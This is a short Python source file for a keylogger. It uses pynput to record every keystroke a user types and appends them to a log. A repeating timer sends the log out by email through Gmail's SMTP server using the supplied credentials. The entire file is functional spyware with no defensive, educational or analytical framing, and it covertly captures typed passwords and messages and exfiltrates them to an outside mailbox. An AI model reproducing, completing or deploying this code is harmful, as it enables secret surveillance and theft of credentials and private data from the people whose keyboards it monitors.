import pynput
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self,string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = str(key)
        self.append_to_log(current_key)

    def report(self):
        self.send_mail()
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, "\n\n" + self.log)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()